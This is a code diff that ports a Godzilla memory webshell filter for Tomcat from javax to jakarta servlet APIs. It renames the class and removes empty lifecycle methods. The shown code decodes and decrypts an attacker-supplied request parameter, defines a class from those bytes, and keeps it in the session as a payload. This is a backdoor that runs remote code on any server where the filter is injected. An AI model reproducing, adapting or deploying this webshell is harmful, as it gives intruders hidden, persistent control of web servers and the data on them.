@@ -2,27 +2,27 @@ package com.reajason.javaweb.memsell.tomcat.godzilla;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.*;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
+import jakarta.servlet.*;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+import jakarta.servlet.http.HttpSession;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 
 /**
  * @author ReaJason
  */
-public class GodzillaFilter extends ClassLoader implements Filter {
+public class GodzillaJakartaFilter extends ClassLoader implements Filter {
     public String key;
     public String pass;
     public String md5;
     public String headerName;
     public String headerValue;
 
-    public GodzillaFilter() {
+    public GodzillaJakartaFilter() {
     }
 
-    public GodzillaFilter(ClassLoader z) {
+    public GodzillaJakartaFilter(ClassLoader z) {
         super(z);
     }
 
@@ -53,7 +53,7 @@ public class GodzillaFilter extends ClassLoader implements Filter {
                 byte[] data = base64Decode(request.getParameter(pass));
                 data = this.x(data, false);
                 if (session.getAttribute("payload") == null) {
-                    session.setAttribute("payload", (new GodzillaFilter(this.getClass().getClassLoader())).Q(data));
+                    session.setAttribute("payload", (new GodzillaJakartaFilter(this.getClass().getClassLoader())).Q(data));
                 } else {
                     request.setAttribute("parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
@@ -78,14 +78,6 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             chain.doFilter(servletRequest, servletResponse);
         }
 
-    }
-
-    @Override
-    public void init(FilterConfig filterConfig) throws ServletException {
-    }
-
-    @Override
-    public void destroy() {
     }
 
     @SuppressWarnings("all")
